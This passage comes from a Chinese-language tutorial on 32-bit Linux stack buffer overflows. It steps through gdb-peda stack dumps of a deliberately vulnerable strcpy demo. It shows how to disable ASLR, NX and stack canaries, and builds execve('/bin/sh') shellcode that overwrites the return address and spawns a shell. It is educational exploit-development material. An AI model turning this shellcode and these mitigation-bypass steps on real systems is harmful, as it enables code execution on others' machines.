+</code></pre><p>观察栈的详细数据，注意小端序的问题，观察12个字节的字符串数据的位置，同时注意后面的数据情况</p>
+<pre><code>gdb-peda$ x/12x $sp
+0xbfffef00:    0xbfffef14    0xbfffef44    0xb7fbb000    0x0000fd57
+0xbfffef10:    0xffffffff    0x44434241    0x48474645    0x004b4a49
+0xbfffef20:    0x00008000    0xb7fbb000    0xbfffef58    0x0804849c
+</code></pre><p>来修改我们的输入字符串为<code>ABCDEFGHIJKL</code></p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void Overflow(char temp[])
+{
+    char buffer[12];
+    strcpy(buffer, temp);
+    printf(&quot;%s\n&quot;, buffer);
+}
+
+int main()
+{
+    char temp[13] = &quot;ABCDEFGHIJKL&quot;;
+    Overflow(temp);
+    return 0;
+}
+</code></pre><p>编译运行</p>
+<pre><code>wnagzihxain@toT0C:~$ gcc -fno-stack-protector -fno-builtin -o Demo Demo.c
+wnagzihxain@toT0C:~$ ./Demo
+ABCDEFGHIJKL
+</code></pre><p>记录此时栈布局</p>
+<pre><code>gdb-peda$ x/12x $sp
+0xbfffef00:    0xbfffef14    0xbfffef43    0xb7fbb000    0x0000fd57
+0xbfffef10:    0xffffffff    0x0000002f    0xb7e15dc8    0xb7fd6858
+0xbfffef20:    0x00008000    0xb7fbb000    0xbfffef58    0x080484a0
+</code></pre><p>单步执行完拷贝指令，再次记录栈布局</p>
+<pre><code>gdb-peda$ x/120x $sp
+0xbfffef00:    0x14    0xef    0xff    0xbf    0x43    0xef    0xff    0xbf
+0xbfffef08:    0x00    0xb0    0xfb    0xb7    0x57    0xfd    0x00    0x00
+0xbfffef10:    0xff    0xff    0xff    0xff    0x41    0x42    0x43    0x44
+0xbfffef18:    0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x4c
+0xbfffef20:    0x00    0x80    0x00    0x00    0x00    0xb0    0xfb    0xb7
+0xbfffef28:    0x58    0xef    0xff    0xbf    0xa0    0x84    0x04    0x08
+0xbfffef30:    0x43    0xef    0xff    0xbf    0x00    0x00    0x00    0x00
+0xbfffef38:    0x50    0x7a    0xe3    0xb7    0xfb    0x84    0x04    0x08
+0xbfffef40:    0x01    0x00    0x00    0x41    0x42    0x43    0x44    0x45
+0xbfffef48:    0x46    0x47    0x48    0x49    0x4a    0x4b    0x4c    0x00
+0xbfffef50:    0xdc    0xb3    0xfb    0xb7    0x70    0xef    0xff    0xbf
+0xbfffef58:    0x00    0x00    0x00    0x00    0x37    0x16    0xe2    0xb7
+0xbfffef60:    0x00    0xb0    0xfb    0xb7    0x00    0xb0    0xfb    0xb7
+0xbfffef68:    0x00    0x00    0x00    0x00    0x37    0x16    0xe2    0xb7
+0xbfffef70:    0x01    0x00    0x00    0x00    0x04    0xf0    0xff    0xbf\
+</code></pre><p>由于一地址的数据是<code>0x00</code>，我们尝试加一字节的数据</p>
+<pre><code>char temp[14] = &quot;ABCDEFGHIJKLM&quot;;
+</code></pre><p>编译运行</p>
+<pre><code>wnagzihxain@toT0C:~$ gcc -fno-stack-protector -fno-builtin -o Demo Demo.c
+wnagzihxain@toT0C:~$ ./Demo
+ABCDEFGHIJKLM
+</code></pre><p>记录栈布局，这里一定要本次调试的数据，虽然一般情况下不会变，但是为了确保万无一失，还是保证每次的数据都是新鲜的好</p>
+<pre><code>gdb-peda$ x/12x $sp
+0xbfffef00:    0xbfffef14    0xbfffef42    0xb7fbb000    0x0000fd57
+0xbfffef10:    0xffffffff    0x0000002f    0xb7e15dc8    0xb7fd6858
+0xbfffef20:    0x00008000    0xb7fbb000    0xbfffef58    0x080484a2
+</code></pre><p>执行完拷贝指令，记录栈布局</p>
+<pre><code>gdb-peda$ x/120x $sp
+0xbfffef00:    0x14    0xef    0xff    0xbf    0x42    0xef    0xff    0xbf
+0xbfffef08:    0x00    0xb0    0xfb    0xb7    0x57    0xfd    0x00    0x00
+0xbfffef10:    0xff    0xff    0xff    0xff    0x41    0x42    0x43    0x44
+0xbfffef18:    0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x4c
+0xbfffef20:    0x4d    0x00    0x00    0x00    0x00    0xb0    0xfb    0xb7
+0xbfffef28:    0x58    0xef    0xff    0xbf    0xa2    0x84    0x04    0x08
+0xbfffef30:    0x42    0xef    0xff    0xbf    0x00    0x00    0x00    0x00
+0xbfffef38:    0x50    0x7a    0xe3    0xb7    0x0b    0x85    0x04    0x08
+0xbfffef40:    0x01    0x00    0x41    0x42    0x43    0x44    0x45    0x46
+0xbfffef48:    0x47    0x48    0x49    0x4a    0x4b    0x4c    0x4d    0x00
+0xbfffef50:    0xdc    0xb3    0xfb    0xb7    0x70    0xef    0xff    0xbf
+0xbfffef58:    0x00    0x00    0x00    0x00    0x37    0x16    0xe2    0xb7
+0xbfffef60:    0x00    0xb0    0xfb    0xb7    0x00    0xb0    0xfb    0xb7
+0xbfffef68:    0x00    0x00    0x00    0x00    0x37    0x16    0xe2    0xb7
+0xbfffef70:    0x01    0x00    0x00    0x00    0x04    0xf0    0xff    0xbf
+</code></pre><p>注意这里，我们最后一个字母<code>M</code>已经写入我们潜意识里定义的栈空间外，但是由于这里属于我们抬高的合法栈空间，并不会对后续指令执行造成影响</p>
+<pre><code>0xbfffef20:    0x4d    0x00    0x00    0x00
+</code></pre><p>我们可以继续执行，并没有出错</p>
+<pre><code>gdb-peda$ c
+Continuing.
+ABCDEFGHIJKLM
+[Inferior 1 (process 2760) exited normally]
+Warning: not running or target is remote
+</code></pre><p>这里对于字符串分配的空间是<code>0x14</code>字节，也就是20字节，同样我们在上面的栈布局中观察出来，只需要20个字节的字符串即可影响EBP的数据，最后还有个<code>\0</code>，我们拿最后这个截断符来修改EBP</p>
+<pre><code>char temp[21] = &quot;ABCDEFGHIJKLMNOPQRST&quot;;
+</code></pre><p>编译运行，看来很有可能是我们最后那个截断符修改了EBP造成了栈的不平衡</p>
+<pre><code>wnagzihxain@toT0C:~$ gcc -fno-stack-protector -fno-builtin -o Demo Demo.c
+wnagzihxain@toT0C:~$ ./Demo
+ABCDEFGHIJKLMNOPQRST
+段错误 (核心已转储)
+</code></pre><p>执行拷贝前记录栈布局</p>
+<pre><code>gdb-peda$ x/32x $sp
+0xbfffeef0:    0xbfffef04    0xbfffef3b    0xbfffef10    0x08048254
+0xbfffef00:    0x00000000    0xbfffefa4    0xb7fbb000    0x0000fd57
+0xbfffef10:    0xffffffff    0x0000002f    0xbfffef58    0x080484ae
+0xbfffef20:    0xbfffef3b    0xb7fbb000    0xb7fb9244    0xb7e210ec
+0xbfffef30:    0x00000001    0x00000000    0x41e37a50    0x45444342
+0xbfffef40:    0x49484746    0x4d4c4b4a    0x51504f4e    0x00545352
+0xbfffef50:    0xb7fbb3dc    0xbfffef70    0x00000000    0xb7e21637
+0xbfffef60:    0xb7fbb000    0xb7fbb000    0x00000000    0xb7e21637
+</code></pre><p>执行完拷贝指令，记录栈布局</p>
+<pre><code>gdb-peda$ x/120x $sp
+0xbfffeef0:    0x04    0xef    0xff    0xbf    0x3b    0xef    0xff    0xbf
+0xbfffeef8:    0x10    0xef    0xff    0xbf    0x54    0x82    0x04    0x08
+0xbfffef00:    0x00    0x00    0x00    0x00    0x41    0x42    0x43    0x44
+0xbfffef08:    0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x4c
+0xbfffef10:    0x4d    0x4e    0x4f    0x50    0x51    0x52    0x53    0x54
+0xbfffef18:    0x00    0xef    0xff    0xbf    0xae    0x84    0x04    0x08
+0xbfffef20:    0x3b    0xef    0xff    0xbf    0x00    0xb0    0xfb    0xb7
+0xbfffef28:    0x44    0x92    0xfb    0xb7    0xec    0x10    0xe2    0xb7
+0xbfffef30:    0x01    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0xbfffef38:    0x50    0x7a    0xe3    0x41    0x42    0x43    0x44    0x45
+0xbfffef40:    0x46    0x47    0x48    0x49    0x4a    0x4b    0x4c    0x4d
+0xbfffef48:    0x4e    0x4f    0x50    0x51    0x52    0x53    0x54    0x00
+0xbfffef50:    0xdc    0xb3    0xfb    0xb7    0x70    0xef    0xff    0xbf
+0xbfffef58:    0x00    0x00    0x00    0x00    0x37    0x16    0xe2    0xb7
+0xbfffef60:    0x00    0xb0    0xfb    0xb7    0x00    0xb0    0xfb    0xb7
+</code></pre><p>由于字符串变长，EBP也要相应的变化，，同时字符串的地址也都会变化，执行前后的EBP对比，由于是小端序，第一个字节被字符串的截断符覆盖了</p>
+<pre><code>EBP: 0xbfffef18 --&gt; 0xbfffef58 --&gt; 0x0
+EBP: 0xbfffef18 --&gt; 0xbfffef00 --&gt; 0x0
+</code></pre><p>关键的内存数据，<code>0xbfffef18</code>是EBP</p>
+<pre><code>0xbfffef00:    0x00    0x00    0x00    0x00    0x41    0x42    0x43    0x44
+0xbfffef08:    0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x4c
+0xbfffef10:    0x4d    0x4e    0x4f    0x50    0x51    0x52    0x53    0x54
+0xbfffef18:    0x00    0xef    0xff    0xbf
+</code></pre><p>至于那种<code>41414141</code>，因为<code>RETN</code>在EBP的后面，我们只需要多填充一些数据，覆盖了<code>RETN</code>，就可以控制EIP，我们这里使用的是<code>AAAA</code>，所以此时的EIP被我们劫持到了<code>0x41414141</code>，这个地址上肯定是没有指令的，gdb+peda帮我们捕获到了这个异常并且输出了一些比较关键的崩溃现场的数据，同时我们也可以手动进行一些崩溃现场数据的提取，比如<code>bt</code>，用于堆栈回溯，查看调用栈，还有堆栈的数据等</p>
+<p><img src="Image/13.png" alt=""></p>
+<h2 id="0x03-shellcode-">0x03 Shellcode编写</h2>
+<p>二进制攻防发展到现在这个阶段，已经有各种针对漏洞的缓解机制，所以在找到了漏洞后，绕过这些缓解机制也是一个关键的环节，比如Linux的CANARY和Windows的GS，Linux和Windows都有的ASLR，Linux的NX和Windows的DEP</p>
+<p>首先使用<code>checksec</code>查看程序开的保护机制</p>
+<pre><code>gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</code></pre><p>一个个来讲讲，接下来都是理论，虽然我也不是很喜欢理论的东西</p>
+<p>这部分详细的描述可以在《Android安全攻防权威指南》找到，大家喜欢的话可以去找找，那本书也不错，推荐阅读</p>
+<p><strong>ASLR</strong>：全称Address Space Layout Randomization，程序运行的时候，内存地址不固定，每次都不一样，虽然上面我们使用gdb动态调试的时候看到的都是固定的，那是因为gdb在调试的时候会关掉ASLR，一般系统都是开了</p>
+<p>查看开没开ASLR，可能有同学只听过0和1，2是什么意思？做好心理准备：<strong>增强版ASLR</strong></p>
+<pre><code>root@toT0C:/home/wnagzihxain# cat /proc/sys/kernel/randomize_va_space
+2
+</code></pre><p>我们root模式下关掉它，就是这么残暴</p>
+<pre><code>root@toT0C:/home/wnagzihxain# echo 0 &gt; /proc/sys/kernel/randomize_va_space
+root@toT0C:/home/wnagzihxain# cat /proc/sys/kernel/randomize_va_space
+0
+</code></pre><p><strong>CANARY</strong>：类似Windows下的GS，在调用函数时，会先生成一个Cookie，一个保存在内存中某处，一个插入栈中，溢出的时候会覆盖掉这个Cookie，函数返回的时候会取出存在某处的Cookie对比栈中的Cookie，不一样表示溢出</p>
+<p>现在有四种模式可以选择</p>
+<pre><code>gcc -fno-stack-protector -o Demo Demo.c  //禁用堆栈保护
+gcc -fstack-protector -o Demo Demo.c     //启用堆栈保护，针对有字符串数组的函数
+gcc -fstack-protector-all -o Demo Demo.c //启用堆栈保护，针对所有函数
+gcc -fstack-protector-strong -o Demo Demo.c //更强版本
+</code></pre><p>一开始编译的时候直接把它关了，奏是这么凑不要脸:)</p>
+<p><strong>FORTIFY</strong>：FORTIFY_SOURCE，增强源码，目前有两种等级，1和2，编译时加上-D_FORTIFY_SOURCE=1或者2即可开启，如果宏为1，则在有strcpy函数的指令周围加上检查缓冲区和待拷贝字符串长度相关的指令，如果宏为2，还会有包括但不仅只有格式化字符串漏洞的检查</p>
+<p><strong>NX</strong>：No eXecute，Windows下叫DEP，默认开启，会将数据所在的内存页设置为不可执行，当我们滑到Shellcode区，执行的为数据区，不可执行，就会触发异常，也就是说直接让数据区的Shellcode失效</p>
+<p>关闭它，对，我们就是要关关关</p>
+<pre><code>wnagzihxain@toT0C:~$ gcc -fno-stack-protector -fno-builtin -zexecstack -o Demo Demo.c
+</code></pre><p>查看保护措施，已经妥妥的关了</p>
+<pre><code>gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : Partial
+</code></pre><p><strong>PIE</strong>：Position-Independent Executable，Linux下开地址随机化是要不少开销的</p>
+<p><strong>RELRO</strong>：RELocation Read-Only，官方说法是设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT(Global Offset Table)攻击</p>
+<p>以上是对目前Linux上一些比较主流的漏洞缓解机制的简单介绍，接下来我们来思考如何构建EXP</p>
+<p>ASLR已经关了，所以在这里我们可以使用硬编码的方式</p>
+<p>没溢出情况下，执行完拷贝指令，我们的栈布局如下</p>
+<pre><code>gdb-peda$ stack 20
+0000| 0xbfffef00 --&gt; 0xbfffef14 (&quot;AAAA&quot;)
+0004| 0xbfffef04 --&gt; 0xbfffef44 (&quot;AAAA&quot;)
+0008| 0xbfffef08 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
+0012| 0xbfffef0c --&gt; 0xfd57 
+0016| 0xbfffef10 --&gt; 0xffffffff 
+0020| 0xbfffef14 (&quot;AAAA&quot;)
+0024| 0xbfffef18 --&gt; 0xb7e15d00 --&gt; 0x19b 
+0028| 0xbfffef1c --&gt; 0xb7fd6858 --&gt; 0xb7e09000 --&gt; 0x464c457f 
+0032| 0xbfffef20 --&gt; 0x8000 
+0036| 0xbfffef24 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
+0040| 0xbfffef28 --&gt; 0xbfffef58 --&gt; 0x0 
+0044| 0xbfffef2c --&gt; 0x804849c (&lt;main+50&gt;:    add    esp,0x10)
+0048| 0xbfffef30 --&gt; 0xbfffef44 (&quot;AAAA&quot;)
+0052| 0xbfffef34 --&gt; 0x0 
+0056| 0xbfffef38 --&gt; 0xb7e37a50 (&lt;__new_exitfn+16&gt;:    add    ebx,0x1835b0)
+0060| 0xbfffef3c --&gt; 0x80484fb (&lt;__libc_csu_init+75&gt;:    add    edi,0x1)
+0064| 0xbfffef40 --&gt; 0x1 
+0068| 0xbfffef44 (&quot;AAAA&quot;)
+0072| 0xbfffef48 --&gt; 0x0 
+0076| 0xbfffef4c --&gt; 0x0
+</code></pre><p>此时我们的EBP是<code>0xbfffef28</code></p>
+<pre><code>EBP: 0xbfffef28 --&gt; 0xbfffef58 --&gt; 0x0
+</code></pre><p>接下来到<code>leave</code>前的指令会将栈顶降低<code>0x10</code>字节</p>
+<pre><code>gdb-peda$ stack 10
+0000| 0xbfffef10 --&gt; 0xffffffff 
+0004| 0xbfffef14 (&quot;AAAA&quot;)
+0008| 0xbfffef18 --&gt; 0xb7e15d00 --&gt; 0x19b 
+0012| 0xbfffef1c --&gt; 0xb7fd6858 --&gt; 0xb7e09000 --&gt; 0x464c457f 
+0016| 0xbfffef20 --&gt; 0x8000 
+0020| 0xbfffef24 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
+0024| 0xbfffef28 --&gt; 0xbfffef58 --&gt; 0x0 
+0028| 0xbfffef2c --&gt; 0x804849c (&lt;main+50&gt;:    add    esp,0x10)
+0032| 0xbfffef30 --&gt; 0xbfffef44 (&quot;AAAA&quot;)
+0036| 0xbfffef34 --&gt; 0x0
+</code></pre><p><code>leave</code>指令等效于</p>
+<pre><code>mov esp, ebp
+pop ebp
+</code></pre><p>先把EBP赋值给ESP，这样当前的ESP就指向<code>0xbfffef28</code>，在将ESP指向的值弹给EBP，这个指向的值为前一函数的EBP，同时<code>pop</code>指令降低了<code>0x04</code>字节的栈顶</p>
+<pre><code>gdb-peda$ stack 10
+0000| 0xbfffef2c --&gt; 0x804849c (&lt;main+50&gt;:    add    esp,0x10)
+0004| 0xbfffef30 --&gt; 0xbfffef44 (&quot;AAAA&quot;)
+0008| 0xbfffef34 --&gt; 0x0 
+0012| 0xbfffef38 --&gt; 0xb7e37a50 (&lt;__new_exitfn+16&gt;:    add    ebx,0x1835b0)
+0016| 0xbfffef3c --&gt; 0x80484fb (&lt;__libc_csu_init+75&gt;:    add    edi,0x1)
+0020| 0xbfffef40 --&gt; 0x1 
+0024| 0xbfffef44 (&quot;AAAA&quot;)
+0028| 0xbfffef48 --&gt; 0x0 
+0032| 0xbfffef4c --&gt; 0x0 
+0036| 0xbfffef50 --&gt; 0xb7fbb3dc --&gt; 0xb7fbc1e0 --&gt; 0x0
+</code></pre><p>此时只需要执行<code>RETN</code>即可完成函数的返回，返回的地址为ESP指向的地址</p>
+<pre><code>0000| 0xbfffef2c --&gt; 0x804849c (&lt;main+50&gt;:    add    esp,0x10)
+</code></pre><p>单步执行，跳回<code>main()</code>函数领空</p>
+<pre><code>[-------------------------------------code-------------------------------------]
+   0x8048493 &lt;main+41&gt;:    lea    eax,[ebp-0x14]
+   0x8048496 &lt;main+44&gt;:    push   eax
+   0x8048497 &lt;main+45&gt;:    call   0x804843b &lt;Overflow&gt;
+=&gt; 0x804849c &lt;main+50&gt;:    add    esp,0x10
+   0x804849f &lt;main+53&gt;:    mov    eax,0x0
+   0x80484a4 &lt;main+58&gt;:    mov    ecx,DWORD PTR [ebp-0x4]
+   0x80484a7 &lt;main+61&gt;:    leave  
+   0x80484a8 &lt;main+62&gt;:    lea    esp,[ecx-0x4]
+</code></pre><p>同时注意栈变化，<code>0x04</code>字节的数据被弹出，弹到EIP寄存器</p>
+<pre><code>[------------------------------------stack-------------------------------------]
+0000| 0xbfffef30 --&gt; 0xbfffef44 (&quot;AAAA&quot;)
+0004| 0xbfffef34 --&gt; 0x0 
+0008| 0xbfffef38 --&gt; 0xb7e37a50 (&lt;__new_exitfn+16&gt;:    add    ebx,0x1835b0)
+0012| 0xbfffef3c --&gt; 0x80484fb (&lt;__libc_csu_init+75&gt;:    add    edi,0x1)
+0016| 0xbfffef40 --&gt; 0x1 
+0020| 0xbfffef44 (&quot;AAAA&quot;)
+0024| 0xbfffef48 --&gt; 0x0 
+0028| 0xbfffef4c --&gt; 0x0
+</code></pre><p>对于程序的返回过程，我们已经弄清楚了，结合上面的溢出分析，当我们的数据覆盖了EBP后面4字节数据，这个位置也叫作返回地址或者EIP</p>
+<p>那么如果我们硬编码一个地址，这个地址指向我们输入数据的首地址，它会不会跳过去呢？</p>
+<p>此时ASLR已关闭，可以硬编码，首先我们把前面的空间全都填充了，包括EBP也都填充<code>A</code>，然后在返回地址填充缓冲区里字符串首地址，要注意小端序的问题</p>
+<p>先填充28个<code>A</code>进去，刚好可以覆盖到返回地址，同时注意目标地址再缓冲区的位置，由于我们输入的字符串长度原因，此时目标地址相对前面测试时的地址要高，但是相对地址是不会变的</p>
+<pre><code>gdb-peda$ stack 10
+0000| 0xbfffeef0 --&gt; 0xbfffef04 --&gt; 0xbfffefa4 --&gt; 0xb24f3e8f 
+0004| 0xbfffeef4 --&gt; 0xbfffef30 (&#39;A&#39; &lt;repeats 28 times&gt;)
+0008| 0xbfffeef8 --&gt; 0xbfffef10 --&gt; 0xffffffff 
+0012| 0xbfffeefc --&gt; 0x8048254 (&quot;__libc_start_main&quot;)
+0016| 0xbfffef00 --&gt; 0x0 
+0020| 0xbfffef04 --&gt; 0xbfffefa4 --&gt; 0xb24f3e8f 
+0024| 0xbfffef08 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
+0028| 0xbfffef0c --&gt; 0xfd57 
+0032| 0xbfffef10 --&gt; 0xffffffff 
+0036| 0xbfffef14 --&gt; 0x2f (&#39;/&#39;)
+`
+</code></pre><p>可以使用Python来完成小端序的转换</p>
+<pre><code>&gt;&gt;&gt; print repr(struct.pack(&quot;&lt;I&quot;, 0xbfffef04))
+&#39;\x04\xef\xff\xbf&#39;
+</code></pre><p>修改输入的字符串</p>
+<pre><code>char temp[32] = &quot;AAAAAAAAAAAAAAAAAAAAAAAA\x04\xef\xff\xbf&quot;;
+</code></pre><p>编译运行</p>
+<pre><code>wnagzihxain@toT0C:~$ gcc -fno-stack-protector -fno-builtin -zexecstack -o Demo Demo.c
+wnagzihxain@toT0C:~$ ./Demo
+AAAAAAAAAAAAAAAAAAAAAAAA���
+段错误 (核心已转储)
+</code></pre><p>执行完拷贝指令，此时栈布局如下，返回地址已被我们覆盖</p>
+<pre><code>gdb-peda$ stack 20
+0000| 0xbfffeef0 --&gt; 0xbfffef04 (&#39;A&#39; &lt;repeats 24 times&gt;, &quot;\004\357\377\277&quot;)
+0004| 0xbfffeef4 --&gt; 0xbfffef30 (&#39;A&#39; &lt;repeats 24 times&gt;, &quot;\004\357\377\277&quot;)
+0008| 0xbfffeef8 --&gt; 0xbfffef10 (&#39;A&#39; &lt;repeats 12 times&gt;, &quot;\004\357\377\277&quot;)
+0012| 0xbfffeefc --&gt; 0x8048254 (&quot;__libc_start_main&quot;)
+0016| 0xbfffef00 --&gt; 0x0 
+0020| 0xbfffef04 (&#39;A&#39; &lt;repeats 24 times&gt;, &quot;\004\357\377\277&quot;)
+0024| 0xbfffef08 (&#39;A&#39; &lt;repeats 20 times&gt;, &quot;\004\357\377\277&quot;)
+0028| 0xbfffef0c (&#39;A&#39; &lt;repeats 16 times&gt;, &quot;\004\357\377\277&quot;)
+0032| 0xbfffef10 (&#39;A&#39; &lt;repeats 12 times&gt;, &quot;\004\357\377\277&quot;)
+0036| 0xbfffef14 (&quot;AAAAAAAA\004\357\377\277&quot;)
+0040| 0xbfffef18 (&quot;AAAA\004\357\377\277&quot;)
+0044| 0xbfffef1c --&gt; 0xbfffef04 (&#39;A&#39; &lt;repeats 24 times&gt;, &quot;\004\357\377\277&quot;)
+0048| 0xbfffef20 --&gt; 0xbfffef00 --&gt; 0x0 
+0052| 0xbfffef24 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
+0056| 0xbfffef28 --&gt; 0xb7fb9244 --&gt; 0xb7e21020 (&lt;_IO_check_libio&gt;:    call   0xb7f28999 &lt;__x86.get_pc_thunk.ax&gt;)
+0060| 0xbfffef2c --&gt; 0xb7e210ec (&lt;init_cacheinfo+92&gt;:    test   eax,eax)
+0064| 0xbfffef30 (&#39;A&#39; &lt;repeats 24 times&gt;, &quot;\004\357\377\277&quot;)
+0068| 0xbfffef34 (&#39;A&#39; &lt;repeats 20 times&gt;, &quot;\004\357\377\277&quot;)
+0072| 0xbfffef38 (&#39;A&#39; &lt;repeats 16 times&gt;, &quot;\004\357\377\277&quot;)
+0076| 0xbfffef3c (&#39;A&#39; &lt;repeats 12 times&gt;, &quot;\004\357\377\277&quot;)
+</code></pre><p>单步走完后面的指令，此时EBP已被我们覆盖成<code>0x41414141</code>，返回地址也被覆盖成了字符串首地址</p>
+<p><img src="Image/14.png" alt=""></p>
+<p>我们单步执行，EIP被我们劫持到字符串的首地址</p>
+<p><img src="Image/15.png" alt=""></p>
+<p>当然这里一堆<code>inc ecx</code>是我们用于测试的无意义指令，如果我们输入的字符串是有意义的指令呢？</p>
+<p>因为Shellcode长度原因，我们把缓冲区开大一点，也更符合真实环境</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void Overflow(char temp[])
+{
+    char buffer[32];
+    strcpy(buffer, temp);
+    printf(&quot;%s\n&quot;, buffer);
+}
+
+int main()
+{
+    char temp[64] = &quot;AAAA&quot;;
+    Overflow(temp);
+    return 0;
+}
+</code></pre><p>运行到拷贝指令，仔细观察EBP和第一个参数</p>
+<p><img src="Image/16.png" alt=""></p>
+<p><code>0xbfffeed0</code>是目标字符串在缓冲区的起始位置，距离EBP有44字节的长度</p>
+<p>修改输入的字符串</p>
+<pre><code>char temp[64] = &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\xd0\xee\xff\xbf&quot;;
+</code></pre><p>拷贝后观察栈的情况，可以看到EBP已经被<code>BBBB</code>覆盖</p>
+<pre><code>gdb-peda$ stack 30
+0000| 0xbfffeec0 --&gt; 0xbfffeed0 (&#39;A&#39; &lt;repeats 40 times&gt;, &quot;BBBB\320\356\377\277&quot;)
+0004| 0xbfffeec4 --&gt; 0xbfffef10 (&#39;A&#39; &lt;repeats 40 times&gt;, &quot;BBBB\320\356\377\277&quot;)
+0008| 0xbfffeec8 --&gt; 0xb7fff918 --&gt; 0x0 
+0012| 0xbfffeecc --&gt; 0xf0b2ff 
+0016| 0xbfffeed0 (&#39;A&#39; &lt;repeats 40 times&gt;, &quot;BBBB\320\356\377\277&quot;)
+0020| 0xbfffeed4 (&#39;A&#39; &lt;repeats 36 times&gt;, &quot;BBBB\320\356\377\277&quot;)
+0024| 0xbfffeed8 (&#39;A&#39; &lt;repeats 32 times&gt;, &quot;BBBB\320\356\377\277&quot;)
+0028| 0xbfffeedc (&#39;A&#39; &lt;repeats 28 times&gt;, &quot;BBBB\320\356\377\277&quot;)
+0032| 0xbfffeee0 (&#39;A&#39; &lt;repeats 24 times&gt;, &quot;BBBB\320\356\377\277&quot;)
+0036| 0xbfffeee4 (&#39;A&#39; &lt;repeats 20 times&gt;, &quot;BBBB\320\356\377\277&quot;)
+0040| 0xbfffeee8 (&#39;A&#39; &lt;repeats 16 times&gt;, &quot;BBBB\320\356\377\277&quot;)
+0044| 0xbfffeeec (&#39;A&#39; &lt;repeats 12 times&gt;, &quot;BBBB\320\356\377\277&quot;)
+0048| 0xbfffeef0 (&quot;AAAAAAAABBBB\320\356\377\277&quot;)
+0052| 0xbfffeef4 (&quot;AAAABBBB\320\356\377\277&quot;)
+0056| 0xbfffeef8 (&quot;BBBB\320\356\377\277&quot;)
+0060| 0xbfffeefc --&gt; 0xbfffeed0 (&#39;A&#39; &lt;repeats 40 times&gt;, &quot;BBBB\320\356\377\277&quot;)
+0064| 0xbfffef00 (0xbfffef00)
+0068| 0xbfffef04 --&gt; 0xbfffefa4 --&gt; 0xb5e79f4a 
+0072| 0xbfffef08 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
+0076| 0xbfffef0c --&gt; 0xfd57 
+0080| 0xbfffef10 (&#39;A&#39; &lt;repeats 40 times&gt;, &quot;BBBB\320\356\377\277&quot;)
+0084| 0xbfffef14 (&#39;A&#39; &lt;repeats 36 times&gt;, &quot;BBBB\320\356\377\277&quot;)
+0088| 0xbfffef18 (&#39;A&#39; &lt;repeats 32 times&gt;, &quot;BBBB\320\356\377\277&quot;)
+0092| 0xbfffef1c (&#39;A&#39; &lt;repeats 28 times&gt;, &quot;BBBB\320\356\377\277&quot;)
+0096| 0xbfffef20 (&#39;A&#39; &lt;repeats 24 times&gt;, &quot;BBBB\320\356\377\277&quot;)
+</code></pre><p>缓冲区已经开的足够大了，我们填充一段有效的指令，这段代码从蒸米那里抄来的，都差不多，不要有<code>bad char</code>就行</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void Overflow(char temp[])
+{
+    char buffer[32];
+    strcpy(buffer, temp);
+    printf(&quot;%s\n&quot;, buffer);
+}
+
+int main()
+{
+    //execve(&quot;/bin/sh&quot;);
+    char temp[64] = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xd0\xee\xff\xbf&quot;;
+    Overflow(temp);
+    return 0;
+}
+</code></pre><p>gdb调试跑起来，成功返回了一个shell</p>
+<pre><code>gdb-peda$ r
+Starting program: /home/wnagzihxain/Demo 
+1���Qh//shh/bin���
+                  ���������������������������
+process 5854 is executing new program: /bin/dash
+$ id    
+[New process 5858]
+process 5858 is executing new program: /usr/bin/id
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library &quot;/lib/i386-linux-gnu/libthread_db.so.1&quot;.
+uid=1000(wnagzihxain) gid=1000(wnagzihxain) groups=1000(wnagzihxain),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+$ [Inferior 2 (process 5858) exited normally]
+Warning: not running or target is remote
+</code></pre><p>不错，鼓掌，撒花<del>~</del>~</p>
+<p>我们不使用gdb调试模式，直接运行</p>
+<pre><code>wnagzihxain@toT0C:~$ ./Demo
+1���Qh//shh/bin���
+                  ���������������������������
+段错误 (核心已转储)
+</code></pre><p>还是一样的返回地址，还是一样的Shellcode，但是为什么这里就出错了呢？</p>
+<p>原因是因为gdb会影响程序的实际地址，在gdb调试模式下，我们看到的地址跟真实环境下是不一样的(本段出自蒸米的《一步一步学ROP之linux_x86篇》)</p>
+<p>所以测试出溢出点后，我们就需要找到<code>buffer</code>在内存的真实地址</p>
+<p>找到真实地址有两种比较常用的方法，一个是<code>core dump</code>，另一个是<code>attach</code></p>
+<p>先来使用<code>core dump</code>，这个需要开启，这里还是抄蒸米的，<code>core.%t</code>真好用</p>
+<pre><code>wnagzihxain@toT0C:~$ ulimit -c unlimited
+wnagzihxain@toT0C:~$ sudo sh -c &#39;echo &quot;/home/wnagzihxain/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&#39;
+</code></pre><p>运行崩溃，记录崩溃现场</p>
+<pre><code>wnagzihxain@toT0C:~$ ./Demo
+1���Qh//shh/bin���
+                  ���������������������������
+段错误 (核心已转储)
+</code></pre><p>查看生成的core文件</p>
+<pre><code>wnagzihxain@toT0C:~$ ls -l core.1491475716
